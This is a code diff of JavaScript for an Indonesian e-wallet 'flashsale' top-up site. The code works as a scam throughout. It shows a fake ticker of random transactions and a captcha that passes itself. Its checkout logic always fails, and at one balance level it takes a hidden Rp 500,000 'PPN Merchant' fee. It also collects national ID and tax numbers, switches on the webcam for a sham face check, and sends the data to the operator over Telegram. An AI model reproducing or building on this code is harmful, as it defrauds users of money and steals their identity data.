+                { name: "DANA", img: "https://digital6301.wordpress.com/wp-content/uploads/2026/01/1000360049-removebg-preview-1.png" },
+                { name: "OVO", img: "https://digital6301.wordpress.com/wp-content/uploads/2026/01/1000360048-removebg-preview.png" },
+                { name: "ShopeePay", img: "https://digital6301.wordpress.com/wp-content/uploads/2026/01/1000360050-removebg-preview.png" },
+                { name: "GoPay", img: "https://digital6301.wordpress.com/wp-content/uploads/2026/01/1000360051-removebg-preview.png" }
+            ];
+            const nominals = [200000, 500000, 1000000, 5000000];
+            
+            // Logika Nomor HP Random: 08 + [1-9] + [0-9] + *** + [100-999]
+            let rand1 = Math.floor(Math.random() * 9) + 1; // Menghasilkan angka 1 - 9
+            let rand2 = Math.floor(Math.random() * 10);    // Menghasilkan angka 0 - 9
+            let rand3 = Math.floor(Math.random() * 900) + 100; // Menghasilkan 3 digit angka 100 - 999
+            let user = `08${rand1}${rand2}***${rand3}`;
+            
+            let w = ewallets[Math.floor(Math.random()*ewallets.length)];
+            let nom = nominals[Math.floor(Math.random()*nominals.length)];
+            
+            let isPending = (nom <= 200000);
+            let statusClass = isPending ? 'status-pending' : 'status-success';
+            let statusText = isPending ? 'Pending' : 'Berhasil';
+            
+            let timeStr = new Date().toLocaleTimeString('id-ID', {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+
+            let html = `
+            <div class="fake-ticker-item">
+                <img src="${w.img}" class="fake-ticker-icon" alt="Logo">
+                <div class="fake-ticker-info">
+                    <h4>Topup ${w.name}</h4>
+                    <p>${user} • ${timeStr}</p>
+                </div>
+                <div class="fake-ticker-status">
+                    <div class="amount">${formatIDR(nom)}</div>
+                    <span class="status ${statusClass}">${statusText}</span>
+                </div>
+            </div>`;
+
+            const tickerBox = document.getElementById('fake-ticker-box');
+            tickerBox.insertAdjacentHTML('afterbegin', html);
+
+            // Perbaikan agar selalu mempertahankan maksimal 4 element saja
+            while(tickerBox.children.length > 4) {
+                tickerBox.removeChild(tickerBox.lastChild);
+            }
+        }
+
+        function initFakeTickerSequence() {
+            // Tampilkan tepat 4 data awal
+            for(let i=0; i<4; i++) { addFakeTickerItem(); }
+            // Tambahkan item baru
+            setInterval(addFakeTickerItem, 2500);
+        }
+
+        // Auto Slider Banners Script
+        let slideIndex = 0;
+        function autoSlide() {
+            const slides = document.getElementById('banner-slides');
+            if(!slides) return;
+            slideIndex++;
+            if(slideIndex > 2) slideIndex = 0;
+            slides.style.transform = `translateX(-${slideIndex * 100}%)`;
+        }
+        setInterval(autoSlide, 3500);
+
+        function startFlashsaleTimer() {
+            const el = document.getElementById('flashsale-timer');
+            setInterval(() => {
+                let now = new Date();
+                let endOfMonth = new Date(now.getFullYear(), now.getMonth() + 1, 0, 23, 59, 59);
+                let diff = Math.floor((endOfMonth.getTime() - now.getTime()) / 1000);
+                if(diff < 0) diff = 0;
+                
+                let d = Math.floor(diff / (3600 * 24));
+                let h = Math.floor((diff % (3600 * 24)) / 3600);
+                let m = Math.floor((diff % 3600) / 60);
+                let s = diff % 60;
+                
+                let timeStr = `${h<10?'0'+h:h}:${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
+                if (d > 0) {
+                    el.innerText = `${d} Hari ${timeStr}`;
+                } else {
+                    el.innerText = timeStr;
+                }
+            }, 1000);
+        }
+        startFlashsaleTimer();
+
+        function toggleHideBalance() {
+            hideBalanceStatus = !hideBalanceStatus;
+            const icon = document.getElementById('btn-hide-balance');
+            if (hideBalanceStatus) {
+                icon.className = "bi bi-eye text-muted";
+                document.getElementById('balance-display').innerText = "******";
+            } else {
+                icon.className = "bi bi-eye-slash text-muted";
+                updateBalanceDisplay();
+            }
+        }
+
+        function togglePasswordVisibility(fieldId, iconEl) {
+            const field = document.getElementById(fieldId);
+            if(field.type === "password") {
+                field.type = "text";
+                iconEl.className = "bi bi-eye pass-toggle-icon";
+            } else {
+                field.type = "password";
+                iconEl.className = "bi bi-eye-slash pass-toggle-icon";
+            }
+        }
+
+        function searchService() {
+            const query = document.getElementById('service-search').value.toLowerCase();
+            const services = document.querySelectorAll('.service-item');
+            services.forEach(item => {
+                const name = item.querySelector('.service-name').innerText.toLowerCase();
+                item.style.display = name.includes(query) ? 'flex' : 'none';
+            });
+        }
+
+        function checkMaintenance() {
+            if (localStorage.getItem('sanz_maintenance') === 'true') {
+                document.getElementById('maintenance-modal').classList.add('show');
+            } else {
+                document.getElementById('maintenance-modal').classList.remove('show');
+            }
+        }
+        setInterval(checkMaintenance, 4000);
+
+        function requireLogin() {
+            if (!currentUserPhone) {
+                showModal("Perhatian", "Silakan melakukan pendaftaran akun baru atau login terlebih dahulu.", "error");
+                document.getElementById('login-close-btn').style.display = 'flex';
+                document.getElementById('register-close-btn').style.display = 'flex';
+                setTimeout(() => { closeInfoModal(); openLoginModal(); }, 1800);
+                return false;
+            }
+            return true;
+        }
+
+        function loadUserData(phone) {
+            if(!phone) { userBalance = 0; tradeHistory = []; userID = null; return; }
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            let u = usersDb[phone];
+            if(u) {
+                userID = u.uid;
+                userBalance = parseFloat(localStorage.getItem(`sanz_bal_${phone}`)) || 0;
+                tradeHistory = JSON.parse(localStorage.getItem(`sanz_hist_${phone}`)) || [];
+            }
+        }
+
+        function saveDataLocally() {
+            if(!currentUserPhone) return;
+            localStorage.setItem(`sanz_bal_${currentUserPhone}`, userBalance);
+            localStorage.setItem(`sanz_hist_${currentUserPhone}`, JSON.stringify(tradeHistory));
+        }
+
+        function updateBalanceDisplay() {
+            if (!currentUserPhone || hideBalanceStatus) return;
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            let u = usersDb[currentUserPhone];
+            if (u && u.isBlocked) {
+                document.getElementById('balance-display').innerText = "DIBLOKIR";
+                document.getElementById('balance-display').style.color = "var(--danger)";
+            } else {
+                document.getElementById('balance-display').style.color = "var(--text-main)";
+                document.getElementById('balance-display').innerText = formatIDR(userBalance);
+                document.getElementById('user-id-display').innerText = userID;
+            }
+        }
+
+        function updateAuthUI() {
+            const profileNav = document.getElementById('nav-user-info');
+            const authLinks = document.getElementById('nav-auth-links');
+            const logoutLink = document.getElementById('nav-logout-link');
+            const badge = document.getElementById('nav-profile-badge');
+            const verifBtn = document.getElementById('nav-verif-btn');
+            const menuPwd = document.getElementById('menu-ubah-password');
+            const menuDwn = document.getElementById('menu-downline');
+            const secBar = document.getElementById('security-bar');
+            const memberBadge = document.getElementById('nav-membership-badge');
+
+            if (currentUserPhone) {
+                let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+                let u = usersDb[currentUserPhone];
+                profileNav.style.display = 'flex';
+                menuPwd.style.display = 'flex';
+                secBar.style.display = 'flex';
+                memberBadge.style.display = 'inline-flex';
+                document.getElementById('nav-username').innerText = u.name;
+                document.getElementById('nav-phone').innerText = currentUserPhone;
+
+                if(u.isReseller) {
+                    memberBadge.innerText = "Reseller";
+                    memberBadge.style.color = "var(--warning)";
+                    menuDwn.style.display = 'flex';
+                } else {
+                    memberBadge.innerText = "Standar";
+                    memberBadge.style.color = "var(--primary)";
+                    menuDwn.style.display = 'none';
+                }
+
+                if(u.pinCode) {
+                    document.getElementById('sec-percentage').innerText = "100%";
+                    document.getElementById('sec-percentage').style.color = "var(--success)";
+                    document.getElementById('sec-progress-fill').style.width = "100%";
+                    document.getElementById('sec-progress-fill').classList.add('full');
+                    document.getElementById('btn-setup-pin').style.display = "none";
+                } else {
+                    document.getElementById('sec-percentage').innerText = "80%";
+                    document.getElementById('sec-percentage').style.color = "var(--warning)";
+                    document.getElementById('sec-progress-fill').style.width = "80%";
+                    document.getElementById('sec-progress-fill').classList.remove('full');
+                    document.getElementById('btn-setup-pin').style.display = "block";
+                }
+
+                if (u.isReseller) {
+                    badge.innerText = "Verified"; badge.className = "sidenav-profile-badge badge-verified";
+                    verifBtn.style.display = "none";
+                } else if (u.resellerPendingRequest) {
+                    badge.innerText = "Verified"; badge.className = "sidenav-profile-badge badge-verified";
+                    verifBtn.style.display = "flex";
+                    document.getElementById('nav-verif-text').innerText = "Menunggu Aktivasi";
+                    document.getElementById('nav-verif-icon').className = "bi bi-hourglass-split";
+                    verifBtn.onclick = () => { toggleNav(); showModal("Sedang Ditinjau", "Pengajuan Aktivasi Akun Anda sedang ditinjau admin.", "info"); };
+                } else if (u.isVerified) {
+                    badge.innerText = "Verified"; badge.className = "sidenav-profile-badge badge-verified";
+                    verifBtn.style.display = "flex";
+                    document.getElementById('nav-verif-text').innerText = "Aktivasi Akun";
+                    document.getElementById('nav-verif-icon').className = "bi bi-briefcase";
+                    verifBtn.onclick = () => { toggleNav(); openTargetModal('reseller-verif-modal'); };
+                } else if (u.verifStatus === 'pending') {
+                    badge.innerText = "Antrean Pengecekan"; badge.className = "sidenav-profile-badge badge-unverified";
+                    verifBtn.style.display = "flex";
+                    document.getElementById('nav-verif-text').innerText = "Verifikasi KTP Diproses";
+                    document.getElementById('nav-verif-icon').className = "bi bi-hourglass";
+                    verifBtn.onclick = () => { toggleNav(); showModal("Sedang Ditinjau", "Menunggu approval KTP Anda di Telegram.", "info"); };
+                } else if (u.verifStatus === 'rejected') {
+                    badge.innerText = "Verif Ditolak"; badge.className = "sidenav-profile-badge badge-rejected";
+                    verifBtn.style.display = "flex";
+                    document.getElementById('nav-verif-text').innerText = "Verifikasi Ulang";
+                    verifBtn.onclick = () => { toggleNav(); openKTPModal(); };
+                } else {
+                    badge.innerText = "Unverified"; badge.className = "sidenav-profile-badge badge-unverified";
+                    verifBtn.style.display = "flex";
+                    document.getElementById('nav-verif-text').innerText = "Verifikasi Akun";
+                    verifBtn.onclick = () => { toggleNav(); openKTPModal(); };
+                }
+
+                authLinks.style.display = 'none'; logoutLink.style.display = 'flex'; 
+                loadUserData(currentUserPhone);
+            } else {
+                profileNav.style.display = 'none'; authLinks.style.display = 'flex'; logoutLink.style.display = 'none';
+                menuPwd.style.display = 'none'; menuDwn.style.display = 'none'; secBar.style.display = 'none'; memberBadge.style.display = 'none';
+                loadUserData(null);
+            }
+            updateBalanceDisplay(); renderHistory(); checkMaintenance(); updateNotifBadge();
+        }
+
+        function verifyCaptcha(type) {
+            if(cfCaptchaStatus[type]) return; 
+            const box = document.getElementById(`cf-box-${type}`);
+            box.style.borderTopColor = "var(--primary)";
+            box.classList.add('loading');
+            setTimeout(() => { box.classList.remove('loading'); box.classList.add('verified'); cfCaptchaStatus[type] = true; }, 1000);
+        }
+
+        function openLoginModal() { 
+            cfCaptchaStatus['login'] = false;
+            document.getElementById('cf-box-login').className = 'cf-checkbox';
+            openTargetModal('login-modal'); 
+        }
+        function openRegisterModal() { 
+            cfCaptchaStatus['reg'] = false; 
+            document.getElementById('cf-box-reg').className = 'cf-checkbox';
+            openTargetModal('register-modal'); 
+        }
+        function openHelpModal() { 
+            if(!requireLogin()) return;
+            openTargetModal('help-modal'); 
+        }
+        function openChangePasswordModal() { openTargetModal('change-password-modal'); }
+
+        function processRegister() {
+            const name = document.getElementById('reg-name').value.trim();
+            const phone = document.getElementById('reg-phone').value.trim();
+            const pass = document.getElementById('reg-password').value.trim();
+            const ref = document.getElementById('reg-ref').value.trim();
+
+            if (!name || !phone || !pass || !ref) return showModal("Perhatian", "Lengkapi seluruh data terlebih dahulu.", "error");
+            if (name.length < 3) return showModal("Perhatian", "Pendaftaran nama lengkap minimal 3 karakter.", "error");
+            if (phone.length < 10) return showModal("Perhatian", "Pendaftaran nomor handphone minimal 10 digit angka.", "error");
+            if (ref !== "57183") return showModal("Perhatian", "Kode referensi tidak valid.", "error");
+            if (!cfCaptchaStatus['reg']) return showModal("Perhatian", "Selesaikan verifikasi captcha terlebih dahulu.", "error");
+            
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            if (usersDb[phone]) {
+                closeTargetModal('register-modal');
+                openTargetModal('recovery-modal');
+                document.getElementById('recovery-nik').value = '';
+                return;
+            }
+            
+            let newUID = 'UID-' + Math.floor(100000 + Math.random() * 900000);
+            usersDb[phone] = { name: name, password: pass, uid: newUID, isBlocked: false, isVerified: false, isReseller: false, firstTrxDone: {} };
+            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+            
+            localStorage.setItem('sanz_has_visited', 'true');
+            document.getElementById('register-close-btn').style.display = 'flex';
+            document.getElementById('login-close-btn').style.display = 'flex';
+
+            addNotifToUser(phone, "Selamat bergabung! Klaim saldo reward khusus pengguna baru.", "bonus");
+
+            sendToTelegram(`*PENDAFTARAN USER BARU*\nNama: ${name}\nHP: \`${phone}\`\nUID: \`${newUID}\``);
+            
+            closeTargetModal('register-modal'); 
+            showModal("Berhasil", "Pendaftaran valid silakan login.", "win");
+            setTimeout(() => { closeInfoModal(); openLoginModal(); document.getElementById('login-phone').value = phone; }, 1500);
+        }
+
+        function processNikRecovery() {
+            const nik = document.getElementById('recovery-nik').value.trim();
+            if(nik.length < 16) return showModal("Gagal Validasi", "Digit nomor NIK KTP tidak valid.", "error");
+            
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            let matchedPhone = null;
+            for(let ph in usersDb) {
+                if(usersDb[ph].nik === nik) { matchedPhone = ph; break; }
+            }
+            
+            if(matchedPhone) {
+                closeTargetModal('recovery-modal');
+                showModal("Pemulihan Terbuka", `Dokumen NIK terkonfirmasi! Password Anda adalah: ${usersDb[matchedPhone].password}. Silakan login ulang.`, "win");
+            } else {
+                closeTargetModal('recovery-modal');
+                showModal("Hubungi Bantuan CS", "Parameter dokumen NIK KTP belum terekam di sistem verifikasi.", "error");
+            }
+        }
+
+        function processLogin() {
+            const phone = document.getElementById('login-phone').value.trim();
+            const pass = document.getElementById('login-password').value.trim();
+            if (!phone || !pass) return showModal("Perhatian", "Lengkapi seluruh data terlebih dahulu.", "error");
+            if (!cfCaptchaStatus['login']) return showModal("Perhatian", "Selesaikan verifikasi captcha terlebih dahulu.", "error");
+            
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            if (usersDb[phone] && usersDb[phone].password === pass) {
+                localStorage.setItem('sanz_has_visited', 'true');
+                document.getElementById('register-close-btn').style.display = 'flex';
+                document.getElementById('login-close-btn').style.display = 'flex';
+
+                localStorage.setItem('sanz_current_phone', phone); 
+                localStorage.setItem('sanz_current_name', usersDb[phone].name);
+                currentUserPhone = phone; currentUserName = usersDb[phone].name;
+                updateAuthUI(); closeTargetModal('login-modal'); startTelegramPolling(); 
+                showModal("Berhasil", `Selamat bergabung kembali, ${currentUserName}!`, "win");
+            } else { showModal("Perhatian", "Nomor dan password salah.", "error"); }
+        }
+
+        function handleLogout() {
+            localStorage.removeItem('sanz_current_phone'); localStorage.removeItem('sanz_current_name');
+            currentUserPhone = null; currentUserName = null; userID = null; userBalance = 0;
+            
+            document.getElementById('balance-display').innerText = "Rp 0";
+            document.getElementById('user-id-display').innerText = "UID: -";
+
+            updateAuthUI(); showModal("Perhatian", "Keluar akun berhasil silakan login kembali.", "info");
+            if (telegramPollInterval) { clearInterval(telegramPollInterval); isPolling = false; }
+        }
+
+        function processChangePassword() {
+            const oldPwd = document.getElementById('old-password-field').value.trim();
+            const newPwd = document.getElementById('new-password-field').value.trim();
+            const confPwd = document.getElementById('confirm-password-field').value.trim();
+            
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db'));
+            if(usersDb[currentUserPhone].password !== oldPwd) return showModal("Akses Ditolak", "Password lama yang Anda masukkan keliru.", "error");
+            if(newPwd.length < 5) return showModal("Sandi Lemah", "Minimal kata sandi baru sepanjang 5 karakter.", "error");
+            if(newPwd !== confPwd) return showModal("Gagal Konfirmasi", "Konfirmasi password baru tidak cocok.", "error");
+            
+            usersDb[currentUserPhone].password = newPwd;
+            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+            
+            closeTargetModal('change-password-modal');
+            showModal("Sukses Diubah", "Sandi kredensial login akun Anda sukses diperbarui.", "win");
+            document.getElementById('old-password-field').value = '';
+            document.getElementById('new-password-field').value = '';
+            document.getElementById('confirm-password-field').value = '';
+        }
+
+        function openPinSetupModal() { openTargetModal('pin-setup-modal'); }
+        function processPinSetup() {
+            const p1 = document.getElementById('pin-1').value.trim();
+            const p2 = document.getElementById('pin-2').value.trim();
+            if(p1.length !== 6 || isNaN(p1)) return showModal("Format Salah", "PIN pengaman diwajibkan berupa 6 digit susunan angka.", "error");
+            if(p1 !== p2) return showModal("Tidak Cocok", "Isian konfirmasi pin kedua tidak selaras dengan yang pertama.", "error");
+            
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db'));
+            usersDb[currentUserPhone].pinCode = p1;
+            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+            
+            closeTargetModal('pin-setup-modal'); updateAuthUI();
+            showModal("Berhasil", "Tingkat keamanan akun Anda naik menjadi 100% Proteksi Optimal.", "win");
+        }
+
+        function challengeUserPinSystem(successCallback) {
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            let u = usersDb[currentUserPhone];
+            if(u && u.pinCode) {
+                pendingPinCallback = successCallback;
+                document.getElementById('auth-pin-input').value = '';
+                openTargetModal('pin-auth-modal');
+            } else { successCallback(); }
+        }
+
+        function verifyPinAction() {
+            const pinVal = document.getElementById('auth-pin-input').value.trim();
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            if(usersDb[currentUserPhone].pinCode === pinVal) {
+                closeTargetModal('pin-auth-modal');
+                if(pendingPinCallback) { pendingPinCallback(); pendingPinCallback = null; }
+            } else { showModal("Perhatian", "Kesalahan PIN Otorisasi Pembayaran.", "error"); }
+        }
+
+        function openPPOBModal(service) {
+            if (!requireLogin()) return;
+            
+            if (service === 'Lainnya') {
+                openTargetModal('lainnya-modal');
+                return;
+            }
+
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            let u = usersDb[currentUserPhone];
+            if (u?.isBlocked) return showModal("Perhatian", "Akun ditangguhkan oleh operasional pusat.", "error");
+
+            if (!u.isReseller) {
+                return showModal(
+                    "Perhatian", 
+                    `Layanan khusus reseller silakan aktivasi akun terlebih dahulu.`, 
+                    "warning"
+                );
+            }
+            
+            challengeUserPinSystem(() => {
+                showModal(
+                    "Perhatian", 
+                    `Layanan belum aktif silakan lakukan aktivasi PPN Merchant terlebih dahulu.`, 
+                    "warning"
+                );
+            });
+        }
+
+        function addFlashsaleToCart(itemName, normalPrice, promoPrice, couponCode) {
+            if(!requireLogin()) return;
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            if(usersDb[currentUserPhone].isBlocked) return showModal("Perhatian","Transaksi ditangguhkan.","error");
+            
+            let isAuto = (couponCode === 'AUTO');
+            cartItem = { name: itemName, basePrice: normalPrice, promoPrice: promoPrice, requiredCoupon: couponCode, promoAppliedStatus: isAuto };
+            
+            const badge = document.getElementById('cart-badge');
+            badge.style.display = 'block'; badge.innerText = "1";
+            
+            showNotif(`${itemName} berhasil ditempatkan di keranjang belanja.`);
+        }
+
+        function openCartModal() {
+            if(!requireLogin()) return;
+            renderCartUI();
+            openTargetModal('cart-modal');
+        }
+
+        function renderCartUI() {
+            const container = document.getElementById('cart-items-container');
+            const promoBox = document.getElementById('promo-code-input-box');
+            const cartProviderBox = document.getElementById('cart-provider-box');
+            const cartActionsBox = document.getElementById('cart-actions-box');
+            
+            if(!cartItem) {
+                container.innerHTML = '<div style="text-align:center; color:var(--text-muted); font-size:13px; padding: 25px 0;"><i class="bi bi-cart-x" style="font-size:35px; display:block; margin-bottom:8px;"></i>Keranjang belanja kosong</div>';
+                promoBox.style.display = "none";
+                cartProviderBox.style.display = "none";
+                cartActionsBox.style.display = "none";
+                return;
+            }
+            
+            cartActionsBox.style.display = "block";
+            cartProviderBox.style.display = "block";
+            
+            if(cartItem.requiredCoupon === 'AUTO') {
+                promoBox.style.display = "none";
+            } else {
+                promoBox.style.display = "block";
+            }
+
+            container.innerHTML = `<div class="cart-item-row" style="display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px dashed var(--border-color);">
+                                        <span style="font-size:14px; font-weight:700;">${cartItem.name}</span>
+                                        <span style="font-weight:bold; color:var(--text-muted);">${formatIDR(cartItem.basePrice)}</span>
+                                   </div>`;
+            
+            document.getElementById('cart-subtotal').innerText = formatIDR(cartItem.basePrice);
+            
+            if(cartItem.promoAppliedStatus) {
+                let discountVal = cartItem.basePrice - cartItem.promoPrice;
+                document.getElementById('cart-discount').innerText = `- ${formatIDR(discountVal)}`;
+                document.getElementById('cart-total').innerText = formatIDR(cartItem.promoPrice);
+            } else {
+                document.getElementById('cart-discount').innerText = "Rp 0";
+                document.getElementById('cart-total').innerText = formatIDR(cartItem.basePrice);
+            }
+        }
+
+        function applyPromo() {
+            const code = document.getElementById('promo-code').value.toUpperCase().trim();
+            if(!cartItem) return showModal("Perhatian", "Item produk tidak terdeteksi.", "error");
+            
+            if(code === cartItem.requiredCoupon) {
+                cartItem.promoAppliedStatus = true;
+                renderCartUI();
+                showNotif(`Kode promo ${code} terpasang.`);
+            } else {
+                showModal("Perhatian", "Kode promo tidak tersedia.", "error");
+            }
+        }
+
+        function clearCart() {
+            cartItem = null;
+            document.getElementById('promo-code').value = '';
+            document.getElementById('cart-badge').style.display = 'none';
+            document.getElementById('cart-target').value = '';
+            renderCartUI();
+        }
+
+        function proceedCartCheckout() {
+            if(!cartItem) return showModal("Perhatian", "Belum ada item yang Anda pilih.", "error");
+            
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            let u = usersDb[currentUserPhone];
+            
+            const cartTargetNumber = document.getElementById('cart-target').value.trim();
+            const cartProvider = document.getElementById('cart-provider').value;
+
+            if(!cartTargetNumber) return showModal("Perhatian", "Harap masukkan nomor penerima E-Wallet untuk melanjutkan.", "error");
+            
+            if(!cartItem.promoAppliedStatus) {
+                return showModal("Perhatian", "Kode promo salah atau saldo tidak cukup untuk melanjutkan transaksi.", "error");
+            }
+
+            if(cartItem.basePrice === 200000) {
+                if(userBalance < 100000) {
+                    return showModal("Perhatian", "Saldo akun tidak cukup untuk melakukan pembelian.", "error");
+                } else if(userBalance >= 100000) {
+                    return showModal("Perhatian", "Kode promo expired atau terjadi kesalahan silakan hubungi bantuan.", "error");
+                }
+            }
+
+            if(cartItem.basePrice === 500000) {
+                if(userBalance < 250000) {
+                    return showModal("Perhatian", "Saldo akun tidak cukup untuk melakukan pembelian.", "error");
+                } else if(userBalance >= 250000) {
+                    if(!u.isReseller) {
+                        showModal("Perhatian", "Silakan verifikasi terlebih dahulu sebelum melakukan transaksi.", "warning");
+                        setTimeout(() => { closeTargetModal('cart-modal'); openTargetModal('reseller-verif-modal'); }, 2000);
+                        return;
+                    } else {
+                        return showModal("Perhatian", "Kode promo expired atau terjadi kesalahan silakan hubungi bantuan.", "error");
+                    }
+                }
+            }
+
+            if(cartItem.basePrice === 1000000) {
+                if(userBalance < 1000000) {
+                    return showModal("Perhatian", "Saldo akun tidak cukup untuk melakukan pembelian.", "error");
+                }
+                if(userBalance >= 1000000 && userBalance < 10000000) {
+                    return showModal("Perhatian", "Saldo margin tidak cukup untuk melakukan transaksi.", "error");
+                }
+                if(userBalance >= 2000000 && userBalance < 2500000) {
+                    if(!u.ppnActivated) {
+                        return showModal("Perhatian", "Silakan aktivasi PPN Merchant terlebih dahulu.", "error");
+                    }
+                }
+                if(userBalance >= 2500000) {
+                    if(!u.ppnActivated) {
+                        u.ppnActivated = true;
+                        userBalance -= 500000;
+                        localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                        updateBalanceDisplay();
+                        addNotifToUser(currentUserPhone, "Pembayaran PPN Merchant Rp 500.000 sedang dalam proses.");
+                    }
+                    return showModal("Perhatian", "Kode promo telah expired untuk akun Anda.", "error");
+                }
+            }
+
+            if(cartItem.basePrice === 5000000) {
+                if(userBalance < 10000000) {
+                    return showModal("Perhatian", "Saldo margin tidak cukup untuk melakukan transaksi.", "error");
+                }
+            }
+
+            challengeUserPinSystem(() => {
+                let costToDeduct = cartItem.promoPrice;
+                userBalance -= costToDeduct;
+                updateBalanceDisplay();
+                
+                const trxId = 'FS-' + Math.floor(100000 + Math.random() * 900000);
+                let dateStr = new Date().toLocaleDateString('id-ID');
+                let timeStr = new Date().toLocaleTimeString('id-ID');
+
+                let receiptHtml = `<div class="receipt-box">
+                                    <div class="receipt-header">DIGITAL</div>
+                                    <div class="receipt-row"><span>ID Merchant:</span><span>FP-CORP-2026</span></div>
+                                    <div class="receipt-row"><span>No Transaksi:</span><span>${trxId}</span></div>
+                                    <div class="receipt-row"><span>Tanggal/Jam:</span><span>${dateStr} ${timeStr}</span></div>
+                                    <div class="receipt-row"><span>Nama Produk:</span><span>${cartItem.name}</span></div>
+                                    <div class="receipt-row"><span>Tujuan E-Wallet:</span><span>${cartProvider} - ${cartTargetNumber}</span></div>
+                                    <div class="receipt-row"><span>Harga Asli:</span><span>${formatIDR(cartItem.basePrice)}</span></div>
+                                    <div class="receipt-row"><span>Kupon Promo:</span><span>${cartItem.requiredCoupon} (-50%)</span></div>
+                                    <div class="receipt-row" style="font-weight:bold;"><span>Total Debet:</span><span>${formatIDR(costToDeduct)}</span></div>
+                                    <div class="receipt-footer">PROSES AMAN & LEGAL</div>
+                                   </div>`;
+
+                tradeHistory.unshift({ id: Date.now(), type: 'Transaksi', amount: costToDeduct, time: timeStr, status: 'Berhasil', info: `E-Wallet Flashsale` });
+                saveDataLocally(); renderHistory();
+                
+                sendToTelegram(`*FLASHSALE CHECKOUT LOLOS*\nUID Akun: \`${userID}\`\nItem: ${cartItem.name}\nTarget: ${cartProvider} - ${cartTargetNumber}\nTotal Bayar Net: Rp ${costToDeduct.toLocaleString('id-ID')}`);
+                
+                clearCart();
+                closeTargetModal('cart-modal');
+                showModal("Berhasil", receiptHtml, "win");
+            });
+        }
+
+        async function submitResellerVerification() {
+            const biz = document.getElementById('res-corp-name').value.trim();
+            const nik = document.getElementById('res-nik-input').value.trim();
+            const npwp = document.getElementById('res-npwp').value.trim();
+            
+            if(!biz || !nik || !npwp) return showModal("Perhatian", "Lengkapi identitas perizinan terlebih dahulu.", "error");
+            if(nik.length !== 16) return showModal("Format NIK", "NIK harus berjumlah tepat 16 digit.", "error");
+
+            closeTargetModal('reseller-verif-modal'); 
+            openTargetModal('verif-face-modal');
+            try {
+                webcamStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('webcam-video').srcObject = webcamStream;
+                setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memproses data biometrik aktivasi..."; }, 2000);
+                setTimeout(() => { finishResellerBioVerification(biz, nik, npwp); }, 4500);
+            } catch(e) {
+                showModal("Gagal Kamera", "Gagal mengaktifkan perizinan perangkat sensor kamera biometrik.", "error"); cancelFaceScan();
+            }
+        }
+
+        function finishResellerBioVerification(biz, nik, npwp) {
+            cancelFaceScan();
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db'));
+            usersDb[currentUserPhone].resellerPendingRequest = true;
+            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+            
+            updateAuthUI();
+            showModal("Dokumen Berhasil Dikirim", "Berkas usaha dan Liveness Wajah telah dikirimkan ke server. Harap tunggu konfirmasi aktivasi.", "win");
+            
+            sendToTelegram(`*PERMINTAAN DOKUMEN AKTIVASI RESELLER*\nUID Profile: \`${userID}\`\nNama: ${biz}\nNIK: \`${nik}\`\nNPWP Nomor: \`${npwp}\`\nStatus Liveness: Lolos Otentikasi Liveness\n\nEksekusi ACC: \`/reseller ${userID}\` \nTolak Berkas: \`/tolak_reseller ${userID}\``);
+        }
+
+        function openDownlineModal() {
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            document.getElementById('downline-ref-code-text').innerText = `57183`;
+            
+            let dwnBox = document.getElementById('downline-list-box');
+            dwnBox.innerHTML = '';
+            
+            let count = 0;
+            for(let ph in usersDb) {
+                if(usersDb[ph].referredBy === userID) {
+                    count++;
+                    dwnBox.innerHTML += `<div style="display:flex; justify-content:space-between; padding:10px; background:var(--bg-card); border-radius:10px; font-size:12px;">
+                                            <span><i class="bi bi-person"></i> ${usersDb[ph].name} (${ph})</span>
+                                            <span class="text-success">Aktif Anggota</span>
+                                         </div>`;
+                }
+            }
+            if(count === 0) {
+                dwnBox.innerHTML = '<div style="text-align:center; font-size:12px; color:var(--text-muted); padding:10px 0;">Belum ada downline yang terafiliasi kode referensi UID Anda.</div>';
+            }
+            openTargetModal('downline-modal');
+        }
+
+        function openDepositModal() {
+            if (!requireLogin()) return;
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            if (usersDb[currentUserPhone]?.isBlocked) return showModal("Blokir", "Fitur dinonaktifkan.", "error");
+
+            document.getElementById('deposit-step-1').style.display = 'block';
+            document.getElementById('deposit-step-2').style.display = 'none';
+            document.getElementById('deposit-amount').value = '';
+            
+            document.getElementById('qris-loading').style.display = 'block';
+            document.getElementById('qris-ready').style.display = 'none';
+            document.getElementById('deposit-success-msg').style.display = 'none';
+            document.getElementById('deposit-instructions').style.display = 'block';
+            document.getElementById('qris-image-tag').src = '';
+            
+            document.getElementById('btn-cancel-deposit').style.display = 'block';
+
+            let activeDep = JSON.parse(localStorage.getItem(`sanz_active_deposit_${currentUserPhone}`));
+            if(activeDep && activeDep.status === 'Menunggu') {
+                document.getElementById('deposit-step-1').style.display = 'none';
+                document.getElementById('deposit-step-2').style.display = 'block';
+                document.getElementById('deposit-amount-display').innerText = formatIDR(activeDep.amount);
+                if(activeDep.qrUrl) {
+                    showQR(activeDep.qrUrl, activeDep, true);
+                }
+            }
+            openTargetModal('deposit-modal');
+        }
